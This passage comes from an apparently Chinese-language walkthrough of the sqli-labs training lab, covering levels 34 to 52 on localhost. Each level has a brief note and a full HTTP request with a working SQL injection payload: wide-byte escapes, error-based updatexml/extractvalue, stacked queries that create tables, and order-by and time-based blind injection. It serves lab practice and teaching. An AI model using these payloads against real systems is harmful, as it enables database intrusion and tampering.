</span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>85<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-34/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami%df&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,database()),1)-- &amp;<span class="hljs-attribute">passwd</span>=aaa&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h1><p>过滤函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_addslashes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$string</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>无闭合，<code>addslashes</code>不起作用，直接拼接payload即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-35/?id=233+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h1><p>过滤函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_quotes</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-variable">$string</span>= <span class="hljs-title function_ invoke__">mysql_real_escape_string</span>(<span class="hljs-variable">$string</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>使用了<code>mysql_real_escape_string</code>函数，同样，宽字节注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-36/?id=222%df&#x27;+union+select+1,md5(1),3--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h1><p>使用<code>mysql_real_escape_string</code>过滤了参数，使用宽字节注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-37/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>85<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-37/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-routeros"><span class="hljs-attribute">uname</span>=hami%df&#x27; <span class="hljs-keyword">and</span> updatexml(1,concat(0x7e,database()),1)-- &amp;<span class="hljs-attribute">passwd</span>=aaa&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><h1 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h1><p>使用<code>mysqli_multi_query</code>进行查询，堆叠注入，这里不能用sleep，（无论如何都会执行<code>;</code>拼接的整条语句）因为这里程序只取了第一部分的结果，没等后面的执行结果，所以数据库执行了sleep，但是web端不会等。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-38/?id=233&#x27;;CREATE+TABLE+less38+LIKE+users;--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h1><p>同38，无闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-39/?id=1;CREATE+TABLE+less39+LIKE+users;--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h1><p>无报错信息了，<code>&#39;)</code>闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-40/?id=1&#x27;);CREATE+TABLE+less40+LIKE+users;--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h1><p>无报错信息，无闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-41/?id=1;CREATE+TABLE+less41+LIKE+users;--+</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br></code></pre></td></tr></table></figure><h1 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h1><p>注入点在<code>login_password</code>，<code>&#39;</code>闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-42/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>86<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-42/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-n1ql">login_user=hami&amp;login_password=adaw&#x27;;<span class="hljs-keyword">CREATE</span>+TABLE+less42+<span class="hljs-keyword">LIKE</span>+users;--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><h1 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h1><p>同42，闭合不同，<code>&#39;)</code>闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-43/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>87<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-42/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-n1ql">login_user=hami&amp;login_password=adaw&#x27;);<span class="hljs-keyword">CREATE</span>+TABLE+less43+<span class="hljs-keyword">LIKE</span>+users;--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><h1 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h1><p>无报错信息，<code>&#39;</code>闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-44/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-42/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-n1ql">login_user=hami&amp;login_password=adaw&#x27;;<span class="hljs-keyword">CREATE</span>+TABLE+less44+<span class="hljs-keyword">LIKE</span>+users;&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><h1 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h1><p>无报错信息，<code>&#39;)</code>闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/Less-45/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>87<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/Less-42/<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_5819d05c0869771ff6e6a81cdec5b2e8=1722584881; PHPSESSID=uh6hm79qqujkja867m7o49h2u1<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-n1ql">login_user=hami&amp;login_password=adaw&#x27;);<span class="hljs-keyword">CREATE</span>+TABLE+less45+<span class="hljs-keyword">LIKE</span>+users;--+&amp;mysubmit=Login</span><br></code></pre></td></tr></table></figure><h1 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h1><p>order by 注入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-46/?sort=1+asc<br>/Less-46/?sort=1+desc<br>/Less-46/?sort=extractvalue(1,concat(0x7e,md5(1)))<br>/Less-46/?sort=1+and(updatexml(1,concat(0x7e,(select+md5(1))),0))<br>/Less-46/?sort=if(1=2,id,username) 顺序不同<br>/Less-46/?sort=if(1=2,1,(select+id+from+information_schema.tables)) 回显or报错<br>/Less-46/?sort=if(1=2,1,sleep(1)) 跟数据条数成倍数关系<br>/Less-46/?sort=rand(1=2) 顺序不同<br></code></pre></td></tr></table></figure><h1 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h1><p>同46，闭合不同</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-47/?sort=1&#x27;and(updatexml(1,concat(0x7e,(select+md5(1))),0))--+<br></code></pre></td></tr></table></figure><h1 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h1><p>无闭合盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-46/?sort=if(1=2,id,username) 顺序不同<br></code></pre></td></tr></table></figure><h1 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h1><p>单引号闭合盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-49/?sort=1&#x27;+and+if(1=2,1,sleep(1))--+<br></code></pre></td></tr></table></figure><h1 id="Less-50"><a href="#Less-50" class="headerlink" title="Less-50"></a>Less-50</h1><p>无闭合，后面4关是用的<code>mysqli_multi_query</code>函数结合order by，除了正常的order by利用也可以堆叠注入利用。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-50/?sort=extractvalue(1,concat(0x7e,md5(1)))<br>/Less-50/?sort=1;CREATE+TABLE+less50+LIKE+users;--+<br></code></pre></td></tr></table></figure><h1 id="Less-51"><a href="#Less-51" class="headerlink" title="Less-51"></a>Less-51</h1><p>单引号闭合</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-51/?sort=1&#x27;+and+extractvalue(1,concat(0x7e,md5(1)))--+<br>/Less-51/?sort=1&#x27;;CREATE+TABLE+less51+LIKE+users;--+<br></code></pre></td></tr></table></figure><h1 id="Less-52"><a href="#Less-52" class="headerlink" title="Less-52"></a>Less-52</h1><p>无闭合盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">/Less-52/?sort=if(1=2,1,sleep(1))--+<br>/Less-52/?sort=1;CREATE+TABLE+less52+LIKE+users;--+<br></code></pre></td></tr></table></figure><h1 id="Less-53"><a href="#Less-53" class="headerlink" 